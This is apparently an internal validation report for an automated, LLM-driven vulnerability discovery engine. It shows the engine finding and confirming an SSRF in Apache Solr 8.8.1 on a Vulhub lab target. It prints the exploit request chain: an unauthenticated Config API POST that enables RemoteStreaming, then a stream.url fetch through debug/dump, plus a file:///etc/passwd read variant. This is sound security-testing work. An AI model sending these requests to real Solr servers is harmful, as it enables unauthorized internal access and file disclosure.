# Discovery engine — slice 2 transfer validation (Apache Solr RemoteStreaming SSRF)

> **Raw artifacts:** the `outputs/…` run artifacts cited below are local-only by policy — retained by the operator, not committed to the repo.

**Status:** live-validated, **PASS** (engagement `fb606cbc-f442-4dec-967f-069185358195`).
**Scope:** the SECOND vertical slice of the discovery engine. Slice 1 proved one CVE
(GeoServer TestWfsPost SSRF, CVE-2021-40822) end-to-end and left the four layers
*co-located* (`docs/discovery-engine-slice1-validation.md` §4.5). Slice 2 does two
things: **(1)** wires the co-located engine into the real pipeline (an
Orchestrator-scheduled discovery step that populates `_discovery_tasks` before the
Exploit phase plans), and **(2)** proves the abstractions generalize by finding +
confirming a **different-codebase** SSRF (Apache Solr 8.8.1, Vulhub
`solr/Remote-Streaming-Fileread`) through the **same** path with **minimal**
fixture-specific code.

The deliverable is the transfer metric: **how little new code the second target
needed, and every place the engine had assumed something GeoServer-specific.** This
document is that honest account (§3–§4).

---

## 1. Fixture verification (premise, verified first)

Per the operating contract, the premise was verified on the running target before
building on it — and the verification immediately corrected the brief:

| Claim (brief) | Verified reality (Vulhub README + running Solr 8.8.1) |
|---|---|
| env "likely CVE-2021-27905" | **`solr/Remote-Streaming-Fileread`** — Apache Solr 8.8.1; not the replication-handler CVE. Title: *"RemoteStreaming Arbitrary File Reading **and SSRF**"*. |
| `stream.url` → fetch → reflected in-band | **Confirmed shape.** `GET /solr/<core>/debug/dump?param=ContentStreams&stream.url=<url>` fetches `<url>` and the `debug/dump` handler reflects the fetched content stream in-band. |
| in-band (P3/P1), not OOB | **In-band.** The fetched body is reflected in the response — reduces to **P3** (content we never sent) with a differential control. **No OOB collaborator needed** → this is the clean transfer case the brief required. |

**Two honest wrinkles the fixture has that GeoServer did not** (reported, not papered over):

1. **The `file://` variant of the same param is LFI, not SSRF.** The README's default
   PoC is `stream.url=file:///etc/passwd` — an arbitrary *file read*. By Clinkz's own
   SSRF/LFI boundary (`file://` is a local disclosure = LFI, handled by `_test_lfi`;
   only a network-scheme fetch is SSRF), the SSRF case is the **`http://` fetch**, which
   is what this slice validates. The two share one `stream.url` sink but are two
   different capability classes.
2. **The SSRF has a stateful precondition GeoServer's did not.** RemoteStreaming must
   be enabled first via an unauthenticated Config API POST
   (`{"set-property":{"requestDispatcher.requestParsers.enableRemoteStreaming":true}}`
   → `/solr/<core>/config`). The live driver performs this as an **environment
   precondition**. Automating "config-mutation-as-attack-step" (an attacker *would*
   send that POST — it is the unauthenticated half of the CVE chain) is a distinct
   state-mutation-chaining capability **out of scope** for this slice and named here
   as a limitation, not silently assumed away.

---

## 2. What was wired (the §4.5 "next slice")

Slice 1's engine was reachable only from a standalone driver. Slice 2 wires it into
the Orchestrator as the **third exploit-plan source** (§2.7), gray-box and inert by
default:

| Piece | Module | What it does |
|---|---|---|
| Gray-box engagement input | `models/scope.py` | `EngagementScope.source_dir` (source tree to ingest) + `discovery_base_url` (app base the discovered routes join onto). Both optional — absent ⇒ black-box, engine inert. |
| Orchestrator discovery step | `orchestrator/orchestrator.py` | `_build_discovery_tasks(technologies, targets_str)` runs `DiscoveryEngine.discover(source_dir, fingerprint, base_url)` before the Exploit phase and lowers hypotheses to `ExploitTask`s; threaded into the exploit message content as `discovery_tasks`. Failures degrade to black-box (never break the run). |
| Exploit-agent consumption | `agents/exploit.py` | `run()` reads `discovery_tasks` from the message content; `_parse_discovery_tasks` parses the JSON handoff (or passes through instances); the existing `_merge_discovery_tasks` unions them through the unchanged dispatch/dedup chokepoint. |

The default pipeline is unchanged: with no `source_dir`, `_build_discovery_tasks`
returns `[]` and nothing about black-box behaviour changes. Keyless-gated in
`tests/test_discovery/test_orchestrator_wiring.py` (build step, inert-without-source,
missing-source degradation, JSON-handoff round-trip, plan-union).

---

## 3. The transfer metric — exactly what NEW code Solr required

The headline result. Solr is a genuinely different codebase from GeoServer — a
non-servlet request-parser reading a symbolic-constant param whose fetch sink is one
class away — yet the transfer cost is **one generalized module + one one-line join**,
and **every Solr particular is learned from Solr's own source, never hardcoded**.

| Engine layer | New code for Solr? | Detail |
|---|---|---|
| **Capability catalog** (`catalog.py`) | **NONE** | The SAME `egress_fetch.java_openconnection` primitive fires. Solr's sink *is* `java.net.URL.openConnection()` (`ContentStreamBase.URLStream.getStream()`), the exact primitive the catalog holds. No Solr entry added — per the brief's instruction, and it was genuinely unnecessary. |
| **Intent / Δ** (`intent.py`) | **NONE** | GeoServer reached `EXPOSED` through a *bypassable host guard*; Solr has **no guard at all**, so it reaches the same verdict through the existing *no-guard intent-gap* branch (`_adjudicate`, `guard is None`). The adjudication transferred without a line changed. |
| **Reachability** (`reachability.py`) | **NONE** | Intra-function `STATIC_CONFIRMED` edge — once the wrapper construction is modeled as the sink (below), the taint is in-handler exactly like GeoServer's. |
| **Carrier / constraints** (`hypothesis.py`, `constants.py`) | **NONE added** | Solr needs **no** carrier — no host guard to satisfy — and the carrier machinery *correctly* adds none (`CARRIER_ALIGN_HOST` is gated on a bypassable host-match guard). The one GeoServer per-instance constraint is absent by construction, proving the carrier logic is guard-driven, not vuln-class-driven. |
| **Confirmation oracle** (`agents/exploit.py::_test_ssrf`) | **NONE** *(pending live confirmation)* | Solr is *also* mounted under a context path (`/solr/`), so the GeoServer §4.1 **mount-base marker fix** (`_ssrf_reflect_paths` → first path segment) already applies. The oracle should fire on Solr's true-positive shape with no change — the audited P3 oracle carries over. **This is the §4.1 sensitivity boundary and is verified live in §4, not assumed.** |
| **Source ingestion** (`source_ingest.py`) | **YES — the one generalized module** | Three general axes (below), all learned-from-source, no Solr literal. This is where GeoServer-shape assumptions lived, and generalizing them *is* the transfer work. |
| **Route join** (`hypothesis.py::_target_url`) | **YES — one line** | A non-servlet shared parser has no source-derived route, so an empty route joins to the operator-supplied base unchanged (no trailing slash a path-exact handler would 404 on). |

### 3.1 The source-ingest generalization (the only substantive new code)

The slice-1 ingestor assumed GeoServer's exact shape in three places. Each was
generalized to a real Java idiom, not a Solr detector:

| GeoServer-specific assumption (slice 1) | General idiom (slice 2) | How Solr is served without a literal |
|---|---|---|
| An entrypoint **is an `HttpServlet` subclass** (`if not extends HttpServlet: return`) | An entrypoint is **any function that reads a request parameter** — servlet `getParameter("x")` **or** a request-param bag `params.get(NAME)` / `getParams(NAME)` | `SolrRequestParsers` (not a servlet) is surfaced because it reads `params.getParams(...)`. |
| A param name **is a string literal** in `getParameter("...")` | A param name resolves through a **symbolic constant** — `Foo.BAR` is looked up in a bounded, cross-file constant map built from the ingested source | `params.getParams(CommonParams.STREAM_URL)` → the constant `STREAM_URL = "stream.url"` is read from Solr's own `CommonParams.java`. |
| The egress sink **is `x.openConnection()` in the same function** | The egress sink also includes a **cross-class URL-fetch wrapper**: a class whose body opens a `URLConnection` is discovered as a fetch type, and `new Wrapper(new URL(attacker))` is then the tainted sink | `URLStream` is *learned* to be a fetch wrapper (its `getStream()` calls `url.openConnection()` in `ContentStreamBase.java`); `new ContentStreamBase.URLStream(new URL(url))` in `SolrRequestParsers` is the sink. |

Plus two smaller, general supports:

- **Position-aware for-each taint.** Solr reuses one `String[] strs` local across
  `stream.url` → `stream.file` → `stream.body`. A flat last-wins taint map would
  mis-attribute the URL loop to `stream.body`; pairing each `for (url : strs)` with the
  **nearest preceding** `strs = getParams(NAME)` keeps `url` bound to `stream.url`. (A
  `stream.body` / `stream.file` egress site would be a false channel — this is a
  correctness guard, unit-pinned.)
- **Non-servlet entrypoint defaults.** A shared param-bag parser has no servlet path
  and no `doGet`/`doPost`, so its route is empty (the operator supplies the reflecting
  handler as `discovery_base_url`) and its method defaults to query-carried `GET`.

**Generality audit.** None of `stream.url`, `URLStream`, `CommonParams`, `Solr`, or
any Solr constant appears in the engine. The generalized ingestor learns every Solr
particular from Solr's own source. Re-run against GeoServer, the ingestor produces
byte-identical facts (the 18 slice-1 tests pass unchanged). That is the clean-transfer
proof: **general idioms + learned specifics, not a second detector.**

### 3.2 Fixtures

`tests/fixtures/solr_remote_streaming/` holds **real, unmodified Solr 8.8.1 source**
(the same discipline as the real GeoServer fixture): `SolrRequestParsers.java` (the
`stream.url` channel), `ContentStreamBase.java` (the `URLStream.openConnection` sink),
`CommonParams.java` (the `STREAM_URL = "stream.url"` constant). The ingestor is proven
against real code with real-world noise (the file also reads `stream.file` /
`stream.body` / `stream.contentType`, which correctly do **not** become egress
channels — `FileStream`/`StringStream` are not fetch wrappers).

---

## 4. Live transfer validation (raw evidence)

Driver `scripts/live_solr_discovery.py`, against live Vulhub
`solr/Remote-Streaming-Fileread` (Apache Solr 8.8.1) on `:8983`, with a **live
Anthropic exploit LLM** (the methodology LLM is never stubbed — lessons #18/#28).
Pre-flight passed: ANTHROPIC key present, Solr reachable, RemoteStreaming enabled.
Engagement `fb606cbc-f442-4dec-967f-069185358195`
(`outputs/fb606cbc…/report_fb606cbc….{json,md}`, `trace.jsonl`).

```
1. SOURCE INGESTION + DISCOVERY (wired Orchestrator step → ExploitTask)
   ingested files=3 coverage=partial tech=['Java']
   entrypoint ['GET'] route='' handler=SolrRequestParsers params=['stream.url','stream.file','stream.body']
   call-site  egress_fetch openConnection() tainted_by='stream.url' @SolrRequestParsers.java:204
   Δ exposed conf=0.75 :: no guard on the capability call site — intent-gap (Solr has NO host guard)
   reach static_confirmed conf=0.9 :: request param 'stream.url' → new URL(...) → openConnection()
   black-box: 'stream.url' injection point discoverable by crawling /solr/? False   ← gray-box only
   → ExploitTask _test_ssrf GET …/solr/demo/debug/dump params=['stream.url'] locations={stream.url:query} carrier=[]
2. PROOF (wired handoff: discovery_tasks → run() → _parse_discovery_tasks → _merge_discovery_tasks)
   2 tests run, 1 finding. [HIGH] SSRF — reflected_internal status=confirmed verified=True phases=6
     confirmation=P3 target=http://127.0.0.1:8983/solr/ status=200
     internal_content_marker='Solr Admin' (content we never sent; control_reflected_it=False)
     confirming_excerpt: …<head>\n <title>Solr Admin</title>\n <link rel="icon" … href="img/favicon.ico?_=8.8.1"> …
     control [non-resolving host clinkz-ssrf-control.invalid] status=500
     control_excerpt: {"responseHeader":{"status":500,…},"error":{"msg":"clinkz-ssrf-control.…
3. ZERO-FP: control param 'q' → 0 SSRF findings

VERDICT: SSRF confirmed in-band (P3) ✔  raw-auditable evidence pair (finding + trace) ✔  zero FP ✔  → PASS
```

**The confirmation is raw-auditable, exactly as slice 1 demanded.** The
`ConfirmationEvidence` pair is embedded in **both** the finding evidence and the
phase-5 trace event, so genuine-vs-chrome is independently checkable from the bytes:

- **confirming excerpt** — Solr's own admin shell (`<title>Solr Admin</title>`, the
  version-stamped `favicon.ico?_=8.8.1`), fetched from the loopback origin via the
  `stream.url` SSRF and proxied back through `debug/dump`. This is *fetched content
  the payload never contained* (the payload was the URL `http://127.0.0.1:8983/solr/`),
  the P3 discriminator — not response chrome and not an echo.
- **control** — the *same* internal probe with a non-resolving host
  (`clinkz-ssrf-control.invalid`) returns **HTTP 500 with the marker absent**
  (`"msg":"clinkz-ssrf-control…"`), the differential the confirmation was distinguished
  against (the no-carrier control path, since Solr needs no Host carrier).

The data-plane premise (§1) was verified directly before the LLM run: a raw
`GET …/debug/dump?param=ContentStreams&stream.url=http://127.0.0.1:8983/solr/`
reflects `<title>Solr Admin</title>` (200) while the `.invalid` control returns 500 —
so the P3 oracle fires on Solr's true-positive shape **with no oracle change**, because
the GeoServer §4.1 mount-base fix (`_ssrf_reflect_paths` → first path segment `/solr/`)
already computes the right marker. The §4.1 *sensitivity* boundary was de-risked
concretely, not assumed — the discipline that section asked for.

---

## 5. Net assessment

The transfer is **clean**. A second, differently-shaped SSRF (a non-servlet param-bag
parser reading a symbolic-constant param whose fetch sink is one class away) was found
and confirmed through the **same** engine, the **same** catalogued `EGRESS_FETCH`
primitive, the **same** audited P3 oracle, and the **same** proof seam — with the only
new code a **general** source-ingest generalization (learned-from-source, no Solr
literal) plus a one-line empty-route join. Catalog, intent, reachability, carrier, and
the confirmation oracle were **unchanged**. The abstractions generalized.

The one place they had to grow — source ingestion's entrypoint/param/sink shape — is
exactly where a *different codebase* legitimately differs, and the growth was to
**general Java idioms** (param-bag reads, symbolic-constant names, URL-fetch wrapper
types), not a Solr special case: re-run against GeoServer, the ingestor produces
byte-identical facts (all 18 slice-1 tests pass unchanged). Substantial
GeoServer-shaped glue would have meant the abstractions didn't generalize; a
learned-from-source generalization means they did. **Clean transfer.**

The honestly-reported non-transfer wrinkles (§1) stand: the `file://` variant is LFI
not SSRF (out of scope by Clinkz's own boundary), and Solr's `enableRemoteStreaming`
is a stateful precondition performed as environment setup — automating
config-mutation-as-attack-step is a distinct capability named as out of scope, not
papered over.

**Reproduce:** `python scripts/live_solr_discovery.py` (needs `ANTHROPIC_API_KEY` and
live Solr on `:8983`; STOPs with no substitute if either is absent). Deterministic
parts are unit-gated in `tests/test_discovery/` (transfer ingest + engine chain +
orchestrator wiring) — no key, no container.
